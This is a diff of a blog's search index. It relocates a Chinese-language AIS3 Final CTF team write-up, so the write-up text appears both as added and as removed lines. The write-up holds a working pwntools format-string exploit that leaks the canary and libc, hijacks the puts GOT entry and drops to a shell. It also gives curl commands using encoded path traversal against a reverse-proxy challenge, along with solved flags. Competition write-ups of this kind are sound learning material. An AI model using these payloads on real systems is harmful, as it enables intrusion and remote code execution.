@@ -1,6 +1,121 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>AIS3 Final CTF - hellOwOrld</title>
+    <url>/AIS3-Final-CTF-hellOwOrld/</url>
+    <content><![CDATA[<p>我們這隊都是第一次參加 AIS3 Final CTF，結果拿到第 18 名的成績，滿開心的ＸＤ<br>
+這邊整理了一些解題過程和思路，有興趣可以看一下～<br>
+如果有任何其他思路也歡迎在下面提出！</p>
+<a id="more"></a>
+<p><img data-src="https://i.imgur.com/Q2Qi8Is.png" alt=""></p>
+<hr>
+<h2 id="misc">misc</h2>
+<h3 id="Painting-bot-100">Painting bot/100</h3>
+<blockquote>
+<p>This is an AI painting bot. Could you get the flag from the bot?<br>
+(Please remember to back up important files in your system.)<br>
+(Any loss caused by this program will not be covered by us.)</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL29wZW4/aWQ9MU9uNTQ2TzJrdnlxUUJXdXlObUtZcldJZW9NcVlmMXZu">http://ctf.ais3.org/files/misc1_artist.exe<i class="fa fa-external-link-alt"></i></span></p>
+</blockquote>
+<p>這是我原本看到題目後做的事<br>
+查看檔案有沒有藏東西<br>
+<img data-src="https://i.imgur.com/7jnPoMd.png" alt=""></p>
+<p>發現有HTML，因此用 dd 拆出來，打開後發現沒屁用<br>
+<img data-src="https://i.imgur.com/KLZ8v8m.png" alt=""></p>
+<blockquote>
+<p>沒頭緒</p>
+</blockquote>
+<blockquote>
+<p>其實也不需要頭緒，只要和小畫家一起打開就好，然後在他開始控制滑鼠前切到小畫家就好QwQ</p>
+</blockquote>
+<hr>
+<h3 id="RPG-200">RPG/200</h3>
+<blockquote>
+<p>Here is a secret RPGMaker XP game. Win the game and you will get the flag!<br>
+If you don’t have rtp, please visit the site at<br>
+<span class="exturl" data-url="aHR0cHM6Ly9zaXRlcy5nb29nbGUuY29tL3NpdGUvdGFpd2FucnBncGxheWVyL3J0cA==">https://sites.google.com/site/taiwanrpgplayer/rtp<i class="fa fa-external-link-alt"></i></span><br>
+and download RPG Maker XP RTP.</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL29wZW4/aWQ9MU9zQy1yS3dfWXpTTk1iT1hSMEhIMlU0UEJfck93Z2VY">http://ctf.ais3.org/files/misc2_rpg.exe<i class="fa fa-external-link-alt"></i></span></p>
+</blockquote>
+<pre><code>由於作者在開發時使用了有中文名稱的 bgm 檔案，如果跳出`沒有發現檔案 Audio/BGM/巨人`的錯誤訊息，~~恭喜你，作者排擠使用非 Big5 碼的族群~~，想辦法轉區吧 (´・ω・`)
+</code></pre>
+<p>首先，到網路上找到神奇的 rgss decrypter，把所有東西全部解出來</p>
+<p><img data-src="https://i.imgur.com/GKo6vmp.png" alt="rgss decrypter"></p>
+<p>接著到官網下載 RPG Maker XP 開發工具，它可以順便裝好 RTP<br>
+開一個新 project 把所有東西丟進去 (或是在 rgss decrypter 點 <code>Generate Game.rxproj</code>)，<br>
+在 end 的場景左上角會發現一個被框起來的格子 (event)<br>
+打開之後就會發現這一行：</p>
+<p><img data-src="https://i.imgur.com/MMgm444.png" alt="Flaaaaaag!!"></p>
+<p>如果把它塞進初始化的 event 裡，遊戲一開始就會跳出 flag 給你看了 OωO</p>
+<hr>
+<h3 id="Hat-300">Hat/300</h3>
+<blockquote>
+<p>Every hacker has his/her own hat! Try to customize one for yourself!</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xUDlkUkNYZzBFY2M5bmR5YU5JZWxZRl9td25iQ3pWeXc=">http://srv03.ctf.ais3.org:9001/<i class="fa fa-external-link-alt"></i></span></p>
+</blockquote>
+<p><img data-src="https://i.imgur.com/kUsr8WU.png" alt=""></p>
+<p>聽說找到 <code>.git</code> 的資料夾可以還原兩個檔案</p>
+<hr>
+<h2 id="pwn">pwn</h2>
+<h3 id="Baby-format-100">Baby format/100</h3>
+<blockquote>
+<p>Nothing in the world cannot be solved by a single printf. If there was, try to work with two printf’s!<br>
+hint: printf has buffer, and you will only see the output after the buffer is full.<br>
+hint2: maybe try GOT Hijack and return to main</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xUERhVzFmSDhqN2kwZEZVV2NGcDFaZTJzejRfQjZnQUk=">http://ctf.ais3.org/files/pwn1_fmt.7z<i class="fa fa-external-link-alt"></i></span></p>
+<p>service is on <span class="exturl" data-url="aHR0cDovL3NydjAxLmN0Zi5haXMzLm9yZzo1NTIx">srv01.ctf.ais3.org:5521<i class="fa fa-external-link-alt"></i></span></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">'srv01.ctf.ais3.org'</span></span><br><span class="line">port = <span class="number">5521</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    r = remote(host, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(<span class="string">'./fmt'</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x400646</span></span><br><span class="line">start_main_offset = <span class="number">0x21ab0</span> + <span class="number">0xe7</span></span><br><span class="line">one_gadget = <span class="number">0x10a38c</span></span><br><span class="line">puts = <span class="number">0x601018</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_fmt_payload</span><span class="params">(value, target)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    num = num % <span class="number">256</span></span><br><span class="line">    <span class="keyword">if</span> value == num:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">    <span class="keyword">elif</span> value &gt; num:</span><br><span class="line">        payload = <span class="string">'%'</span> + str(value-num) + <span class="string">'c'</span> + target</span><br><span class="line">        num = value</span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        n = <span class="number">256</span>-num + value</span><br><span class="line">        num = value</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'%'</span> + str(n) + <span class="string">'c'</span> + target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num = <span class="number">73</span></span><br><span class="line">payload = <span class="string">'startLeak:%39$p:%41$p:%43$p:%69$p'</span></span><br><span class="line">payload += get_fmt_payload(<span class="number">0x46</span>, <span class="string">'%32$hhn'</span>)</span><br><span class="line">payload += get_fmt_payload(<span class="number">0x06</span>, <span class="string">'%33$hhn'</span>)</span><br><span class="line">payload += get_fmt_payload(<span class="number">0x40</span>, <span class="string">'%34$hhn'</span>)</span><br><span class="line">payload += <span class="string">'%10000c'</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>, <span class="string">'\x00'</span>)</span><br><span class="line">payload += p64(puts)</span><br><span class="line">payload += p64(puts+<span class="number">0x1</span>)</span><br><span class="line">payload += p64(puts+<span class="number">0x2</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">'startLeak:'</span>)</span><br><span class="line"></span><br><span class="line">canary = int(r.recvuntil(<span class="string">':'</span>)[:<span class="number">-1</span>], <span class="number">16</span>)</span><br><span class="line">libc = int(r.recvuntil(<span class="string">':'</span>)[:<span class="number">-1</span>], <span class="number">16</span>) - start_main_offset</span><br><span class="line">ret_addr = int(r.recvuntil(<span class="string">':'</span>)[:<span class="number">-1</span>], <span class="number">16</span>) - <span class="number">0xe0</span></span><br><span class="line">print(<span class="string">'libc:'</span>, hex(libc))</span><br><span class="line">print(<span class="string">'canary:'</span>, hex(canary))</span><br><span class="line">print(<span class="string">'ret_addr:'</span>, hex(ret_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gadget = libc+one_gadget</span><br><span class="line"></span><br><span class="line">print(<span class="string">'gadget:'</span>, hex(gadget))</span><br><span class="line">num = <span class="number">0</span></span><br><span class="line">payload = get_fmt_payload(gadget&amp;<span class="number">0xff</span>, <span class="string">'%32$hhn'</span>)</span><br><span class="line">gadget = gadget &gt;&gt; <span class="number">8</span></span><br><span class="line">payload += get_fmt_payload(gadget&amp;<span class="number">0xff</span>, <span class="string">'%33$hhn'</span>)</span><br><span class="line">gadget = gadget &gt;&gt; <span class="number">8</span></span><br><span class="line">payload += get_fmt_payload(gadget&amp;<span class="number">0xff</span>, <span class="string">'%34$hhn'</span>)</span><br><span class="line">gadget = gadget &gt;&gt; <span class="number">8</span></span><br><span class="line">payload += get_fmt_payload(gadget&amp;<span class="number">0xff</span>, <span class="string">'%35$hhn'</span>)</span><br><span class="line">gadget = gadget &gt;&gt; <span class="number">8</span></span><br><span class="line">payload += get_fmt_payload(gadget&amp;<span class="number">0xff</span>, <span class="string">'%36$hhn'</span>)</span><br><span class="line">gadget = gadget &gt;&gt; <span class="number">8</span></span><br><span class="line">payload += get_fmt_payload(gadget&amp;<span class="number">0xff</span>, <span class="string">'%37$hhn'</span>)</span><br><span class="line">gadget = gadget &gt;&gt; <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>, <span class="string">'\x00'</span>)</span><br><span class="line">payload += p64(puts)</span><br><span class="line">payload += p64(puts+<span class="number">0x1</span>)</span><br><span class="line">payload += p64(puts+<span class="number">0x2</span>)</span><br><span class="line">payload += p64(puts+<span class="number">0x3</span>)</span><br><span class="line">payload += p64(puts+<span class="number">0x4</span>)</span><br><span class="line">payload += p64(puts+<span class="number">0x5</span>)</span><br><span class="line">payload += p64(puts+<span class="number">0x6</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="web">web</h2>
+<h3 id="Secret-message-100">Secret message/100</h3>
+<blockquote>
+<p>One secret person embeds a secret message in the website. Could you find the message?</p>
+<p><span class="exturl" data-url="aHR0cDovL3NydjAyLmN0Zi5haXMzLm9yZzo4ODg3Lw==">http://srv02.ctf.ais3.org:8887/<i class="fa fa-external-link-alt"></i></span></p>
+</blockquote>
+<p><img data-src="https://i.imgur.com/pThCerf.png" alt=""></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">potocol=GET</span><br><span class="line"></span><br><span class="line">i=0</span><br><span class="line">while [ $i -lt 100 ]; do</span><br><span class="line">	</span><br><span class="line">	curl http://srv02.ctf.ais3.org:8887/ -i -X $potocol &gt;&gt; flags.txt </span><br><span class="line">	potocol=$(curl http://srv02.ctf.ais3.org:8887/ -i -X $potocol | grep Next | cut -f 2 -d ' ' | tr -d "\r")</span><br><span class="line"></span><br><span class="line">	echo &gt;&gt; flags.txt </span><br><span class="line"></span><br><span class="line">	i=$[$i+1]</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+<p>然後我用手拼起來…</p>
+<h4 id="Flag">Flag</h4>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AIS3&#123;HtTpMe5h0dI5FunaNdGo0DXDdDdDDDx!&#125;</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="Reverse-proxy-200">Reverse proxy/200</h3>
+<blockquote>
+<p>Bob setup a simple reverse proxy, and configured some passwords.<br>
+Unfortunately, he lost the password. Could you please help him to find it out?<br>
+<span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xUGJ1dEtMVG1vYm5MRThCZVVXVVV0TERCQmQwaUpPRWs=">http://ctf.ais3.org/files/web2_main.py<i class="fa fa-external-link-alt"></i></span></p>
+<p><span class="exturl" data-url="aHR0cDovL3NydjAyLmN0Zi5haXMzLm9yZzo4Nzg3Lw==">http://srv02.ctf.ais3.org:8787/<i class="fa fa-external-link-alt"></i></span></p>
+</blockquote>
+<p>這題一開始有提供 python 的程式，可以把它執行起來，會比較好研究</p>
+<p>在程式中可以看到，編輯中</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl http://srv02.ctf.ais3.org:8787/%2e%2e/%2e%2e/%2e%2e/password/wa -X POST &gt; /dev/null</span><br><span class="line">curl http://srv02.ctf.ais3.org:8787/wa -X ADMIN -d 'QAQ'</span><br></pre></td></tr></table></figure>
+<h4 id="Flag-2">Flag</h4>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AIS3&#123;f1aSk_pr0Xy_5Erver_15_N1Ce!!&#125;</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="Invitation-letter-300">Invitation letter/300</h3>
+<blockquote>
+<p>Customize your own invitation letter!</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xUGNPTFJVWXd3dTQtbFhDQVdBQ09xNGRMWTBGUm9pQy0=">http://srv03.ctf.ais3.org:9002/<i class="fa fa-external-link-alt"></i></span></p>
+</blockquote>
+<p><img data-src="https://i.imgur.com/E51MKNP.png" alt=""></p>
+<p>==還沒解完==</p>
+<p>robots.txt<br>
+<span class="exturl" data-url="aHR0cDovL3NydjAzLmN0Zi5haXMzLm9yZzo5MDAyL3JvYm90cy50eHQ=">http://srv03.ctf.ais3.org:9002/robots.txt<i class="fa fa-external-link-alt"></i></span></p>
+<p><img data-src="https://i.imgur.com/CBWqoJ4.png" alt=""></p>
+<p>看起來是程式碼<br>
+<span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xUHM5am1BNU9Tcjh4Q2cxalJKbklJbDJqeG54ZGU1NnM=">http://srv03.ctf.ais3.org:9002/files/app.py.old_20180531<i class="fa fa-external-link-alt"></i></span></p>
+<p>無法存取的 flag.txt<br>
+<span class="exturl" data-url="aHR0cDovL3NydjAzLmN0Zi5haXMzLm9yZzo5MDAyL2ZpbGVzL2ZsYWcudHh0">http://srv03.ctf.ais3.org:9002/files/flag.txt<i class="fa fa-external-link-alt"></i></span></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>AIS3</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>AIS3 2018 write-up</title>
     <url>/AIS3-2018-write-up/</url>
     <content><![CDATA[<p>今年第二次參加 AIS3 pre-exam 的感想</p>
@@ -146,147 +261,9 @@
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
         <tag>AIS3</tag>
+        <tag>CTF</tag>
         <tag>Security</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Android 學習問題紀錄</title>
-    <url>/Android-%E5%AD%B8%E7%BF%92%E5%95%8F%E9%A1%8C%E7%B4%80%E9%8C%84/</url>
-    <content><![CDATA[<h2 id="紀錄-1">紀錄 1</h2>
-<h3 id="問題">問題</h3>
-<p>在 OkHttp 的 onResponse 中使用 Toast 會噴錯，但 Retrofit 不會。<br>
-<a id="more"></a></p>
-<h3 id="原因">原因</h3>
-<p>OkHttp 不是執行在 UI Thread，但 Retrofit 是。</p>
-<h2 id="紀錄-2">紀錄 2</h2>
-<h3 id="問題-2">問題</h3>
-<p>在 OkHttp  的 onResponse 中使用 Toast 會噴錯。</p>
-<h3 id="原因-2">原因</h3>
-<p>OkHttp 不是執行在 UI Thread。</p>
-<h3 id="解法">解法</h3>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 解法1</span></span><br><span class="line">Handler handler = <span class="keyword">new</span> Handler(Looper.getMainLooper());</span><br><span class="line">handler.post(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// TODO</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 解法2</span></span><br><span class="line">activity.runOnUiThread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Android</category>
-      </categories>
-      <tags>
-        <tag>Android</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>AIS3 Final CTF - hellOwOrld</title>
-    <url>/AIS3-Final-CTF-hellOwOrld/</url>
-    <content><![CDATA[<p>我們這隊都是第一次參加 AIS3 Final CTF，結果拿到第 18 名的成績，滿開心的ＸＤ<br>
-這邊整理了一些解題過程和思路，有興趣可以看一下～<br>
-如果有任何其他思路也歡迎在下面提出！</p>
-<a id="more"></a>
-<p><img data-src="https://i.imgur.com/Q2Qi8Is.png" alt=""></p>
-<hr>
-<h2 id="misc">misc</h2>
-<h3 id="Painting-bot-100">Painting bot/100</h3>
-<blockquote>
-<p>This is an AI painting bot. Could you get the flag from the bot?<br>
-(Please remember to back up important files in your system.)<br>
-(Any loss caused by this program will not be covered by us.)</p>
-<p><span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL29wZW4/aWQ9MU9uNTQ2TzJrdnlxUUJXdXlObUtZcldJZW9NcVlmMXZu">http://ctf.ais3.org/files/misc1_artist.exe<i class="fa fa-external-link-alt"></i></span></p>
-</blockquote>
-<p>這是我原本看到題目後做的事<br>
-查看檔案有沒有藏東西<br>
-<img data-src="https://i.imgur.com/7jnPoMd.png" alt=""></p>
-<p>發現有HTML，因此用 dd 拆出來，打開後發現沒屁用<br>
-<img data-src="https://i.imgur.com/KLZ8v8m.png" alt=""></p>
-<blockquote>
-<p>沒頭緒</p>
-</blockquote>
-<blockquote>
-<p>其實也不需要頭緒，只要和小畫家一起打開就好，然後在他開始控制滑鼠前切到小畫家就好QwQ</p>
-</blockquote>
-<hr>
-<h3 id="RPG-200">RPG/200</h3>
-<blockquote>
-<p>Here is a secret RPGMaker XP game. Win the game and you will get the flag!<br>
-If you don’t have rtp, please visit the site at<br>
-<span class="exturl" data-url="aHR0cHM6Ly9zaXRlcy5nb29nbGUuY29tL3NpdGUvdGFpd2FucnBncGxheWVyL3J0cA==">https://sites.google.com/site/taiwanrpgplayer/rtp<i class="fa fa-external-link-alt"></i></span><br>
-and download RPG Maker XP RTP.</p>
-<p><span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL29wZW4/aWQ9MU9zQy1yS3dfWXpTTk1iT1hSMEhIMlU0UEJfck93Z2VY">http://ctf.ais3.org/files/misc2_rpg.exe<i class="fa fa-external-link-alt"></i></span></p>
-</blockquote>
-<pre><code>由於作者在開發時使用了有中文名稱的 bgm 檔案，如果跳出`沒有發現檔案 Audio/BGM/巨人`的錯誤訊息，~~恭喜你，作者排擠使用非 Big5 碼的族群~~，想辦法轉區吧 (´・ω・`)
-</code></pre>
-<p>首先，到網路上找到神奇的 rgss decrypter，把所有東西全部解出來</p>
-<p><img data-src="https://i.imgur.com/GKo6vmp.png" alt="rgss decrypter"></p>
-<p>接著到官網下載 RPG Maker XP 開發工具，它可以順便裝好 RTP<br>
-開一個新 project 把所有東西丟進去 (或是在 rgss decrypter 點 <code>Generate Game.rxproj</code>)，<br>
-在 end 的場景左上角會發現一個被框起來的格子 (event)<br>
-打開之後就會發現這一行：</p>
-<p><img data-src="https://i.imgur.com/MMgm444.png" alt="Flaaaaaag!!"></p>
-<p>如果把它塞進初始化的 event 裡，遊戲一開始就會跳出 flag 給你看了 OωO</p>
-<hr>
-<h3 id="Hat-300">Hat/300</h3>
-<blockquote>
-<p>Every hacker has his/her own hat! Try to customize one for yourself!</p>
-<p><span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xUDlkUkNYZzBFY2M5bmR5YU5JZWxZRl9td25iQ3pWeXc=">http://srv03.ctf.ais3.org:9001/<i class="fa fa-external-link-alt"></i></span></p>
-</blockquote>
-<p><img data-src="https://i.imgur.com/kUsr8WU.png" alt=""></p>
-<p>聽說找到 <code>.git</code> 的資料夾可以還原兩個檔案</p>
-<hr>
-<h2 id="pwn">pwn</h2>
-<h3 id="Baby-format-100">Baby format/100</h3>
-<blockquote>
-<p>Nothing in the world cannot be solved by a single printf. If there was, try to work with two printf’s!<br>
-hint: printf has buffer, and you will only see the output after the buffer is full.<br>
-hint2: maybe try GOT Hijack and return to main</p>
-<p><span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xUERhVzFmSDhqN2kwZEZVV2NGcDFaZTJzejRfQjZnQUk=">http://ctf.ais3.org/files/pwn1_fmt.7z<i class="fa fa-external-link-alt"></i></span></p>
-<p>service is on <span class="exturl" data-url="aHR0cDovL3NydjAxLmN0Zi5haXMzLm9yZzo1NTIx">srv01.ctf.ais3.org:5521<i class="fa fa-external-link-alt"></i></span></p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">'srv01.ctf.ais3.org'</span></span><br><span class="line">port = <span class="number">5521</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    r = remote(host, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(<span class="string">'./fmt'</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x400646</span></span><br><span class="line">start_main_offset = <span class="number">0x21ab0</span> + <span class="number">0xe7</span></span><br><span class="line">one_gadget = <span class="number">0x10a38c</span></span><br><span class="line">puts = <span class="number">0x601018</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_fmt_payload</span><span class="params">(value, target)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    num = num % <span class="number">256</span></span><br><span class="line">    <span class="keyword">if</span> value == num:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">    <span class="keyword">elif</span> value &gt; num:</span><br><span class="line">        payload = <span class="string">'%'</span> + str(value-num) + <span class="string">'c'</span> + target</span><br><span class="line">        num = value</span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        n = <span class="number">256</span>-num + value</span><br><span class="line">        num = value</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'%'</span> + str(n) + <span class="string">'c'</span> + target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num = <span class="number">73</span></span><br><span class="line">payload = <span class="string">'startLeak:%39$p:%41$p:%43$p:%69$p'</span></span><br><span class="line">payload += get_fmt_payload(<span class="number">0x46</span>, <span class="string">'%32$hhn'</span>)</span><br><span class="line">payload += get_fmt_payload(<span class="number">0x06</span>, <span class="string">'%33$hhn'</span>)</span><br><span class="line">payload += get_fmt_payload(<span class="number">0x40</span>, <span class="string">'%34$hhn'</span>)</span><br><span class="line">payload += <span class="string">'%10000c'</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>, <span class="string">'\x00'</span>)</span><br><span class="line">payload += p64(puts)</span><br><span class="line">payload += p64(puts+<span class="number">0x1</span>)</span><br><span class="line">payload += p64(puts+<span class="number">0x2</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">'startLeak:'</span>)</span><br><span class="line"></span><br><span class="line">canary = int(r.recvuntil(<span class="string">':'</span>)[:<span class="number">-1</span>], <span class="number">16</span>)</span><br><span class="line">libc = int(r.recvuntil(<span class="string">':'</span>)[:<span class="number">-1</span>], <span class="number">16</span>) - start_main_offset</span><br><span class="line">ret_addr = int(r.recvuntil(<span class="string">':'</span>)[:<span class="number">-1</span>], <span class="number">16</span>) - <span class="number">0xe0</span></span><br><span class="line">print(<span class="string">'libc:'</span>, hex(libc))</span><br><span class="line">print(<span class="string">'canary:'</span>, hex(canary))</span><br><span class="line">print(<span class="string">'ret_addr:'</span>, hex(ret_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gadget = libc+one_gadget</span><br><span class="line"></span><br><span class="line">print(<span class="string">'gadget:'</span>, hex(gadget))</span><br><span class="line">num = <span class="number">0</span></span><br><span class="line">payload = get_fmt_payload(gadget&amp;<span class="number">0xff</span>, <span class="string">'%32$hhn'</span>)</span><br><span class="line">gadget = gadget &gt;&gt; <span class="number">8</span></span><br><span class="line">payload += get_fmt_payload(gadget&amp;<span class="number">0xff</span>, <span class="string">'%33$hhn'</span>)</span><br><span class="line">gadget = gadget &gt;&gt; <span class="number">8</span></span><br><span class="line">payload += get_fmt_payload(gadget&amp;<span class="number">0xff</span>, <span class="string">'%34$hhn'</span>)</span><br><span class="line">gadget = gadget &gt;&gt; <span class="number">8</span></span><br><span class="line">payload += get_fmt_payload(gadget&amp;<span class="number">0xff</span>, <span class="string">'%35$hhn'</span>)</span><br><span class="line">gadget = gadget &gt;&gt; <span class="number">8</span></span><br><span class="line">payload += get_fmt_payload(gadget&amp;<span class="number">0xff</span>, <span class="string">'%36$hhn'</span>)</span><br><span class="line">gadget = gadget &gt;&gt; <span class="number">8</span></span><br><span class="line">payload += get_fmt_payload(gadget&amp;<span class="number">0xff</span>, <span class="string">'%37$hhn'</span>)</span><br><span class="line">gadget = gadget &gt;&gt; <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>, <span class="string">'\x00'</span>)</span><br><span class="line">payload += p64(puts)</span><br><span class="line">payload += p64(puts+<span class="number">0x1</span>)</span><br><span class="line">payload += p64(puts+<span class="number">0x2</span>)</span><br><span class="line">payload += p64(puts+<span class="number">0x3</span>)</span><br><span class="line">payload += p64(puts+<span class="number">0x4</span>)</span><br><span class="line">payload += p64(puts+<span class="number">0x5</span>)</span><br><span class="line">payload += p64(puts+<span class="number">0x6</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="web">web</h2>
-<h3 id="Secret-message-100">Secret message/100</h3>
-<blockquote>
-<p>One secret person embeds a secret message in the website. Could you find the message?</p>
-<p><span class="exturl" data-url="aHR0cDovL3NydjAyLmN0Zi5haXMzLm9yZzo4ODg3Lw==">http://srv02.ctf.ais3.org:8887/<i class="fa fa-external-link-alt"></i></span></p>
-</blockquote>
-<p><img data-src="https://i.imgur.com/pThCerf.png" alt=""></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">potocol=GET</span><br><span class="line"></span><br><span class="line">i=0</span><br><span class="line">while [ $i -lt 100 ]; do</span><br><span class="line">	</span><br><span class="line">	curl http://srv02.ctf.ais3.org:8887/ -i -X $potocol &gt;&gt; flags.txt </span><br><span class="line">	potocol=$(curl http://srv02.ctf.ais3.org:8887/ -i -X $potocol | grep Next | cut -f 2 -d ' ' | tr -d "\r")</span><br><span class="line"></span><br><span class="line">	echo &gt;&gt; flags.txt </span><br><span class="line"></span><br><span class="line">	i=$[$i+1]</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
-<p>然後我用手拼起來…</p>
-<h4 id="Flag">Flag</h4>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AIS3&#123;HtTpMe5h0dI5FunaNdGo0DXDdDdDDDx!&#125;</span><br></pre></td></tr></table></figure>
-<hr>
-<h3 id="Reverse-proxy-200">Reverse proxy/200</h3>
-<blockquote>
-<p>Bob setup a simple reverse proxy, and configured some passwords.<br>
-Unfortunately, he lost the password. Could you please help him to find it out?<br>
-<span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xUGJ1dEtMVG1vYm5MRThCZVVXVVV0TERCQmQwaUpPRWs=">http://ctf.ais3.org/files/web2_main.py<i class="fa fa-external-link-alt"></i></span></p>
-<p><span class="exturl" data-url="aHR0cDovL3NydjAyLmN0Zi5haXMzLm9yZzo4Nzg3Lw==">http://srv02.ctf.ais3.org:8787/<i class="fa fa-external-link-alt"></i></span></p>
-</blockquote>
-<p>這題一開始有提供 python 的程式，可以把它執行起來，會比較好研究</p>
-<p>在程式中可以看到，編輯中</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl http://srv02.ctf.ais3.org:8787/%2e%2e/%2e%2e/%2e%2e/password/wa -X POST &gt; /dev/null</span><br><span class="line">curl http://srv02.ctf.ais3.org:8787/wa -X ADMIN -d 'QAQ'</span><br></pre></td></tr></table></figure>
-<h4 id="Flag-2">Flag</h4>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AIS3&#123;f1aSk_pr0Xy_5Erver_15_N1Ce!!&#125;</span><br></pre></td></tr></table></figure>
-<hr>
-<h3 id="Invitation-letter-300">Invitation letter/300</h3>
-<blockquote>
-<p>Customize your own invitation letter!</p>
-<p><span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xUGNPTFJVWXd3dTQtbFhDQVdBQ09xNGRMWTBGUm9pQy0=">http://srv03.ctf.ais3.org:9002/<i class="fa fa-external-link-alt"></i></span></p>
-</blockquote>
-<p><img data-src="https://i.imgur.com/E51MKNP.png" alt=""></p>
-<p>==還沒解完==</p>
-<p>robots.txt<br>
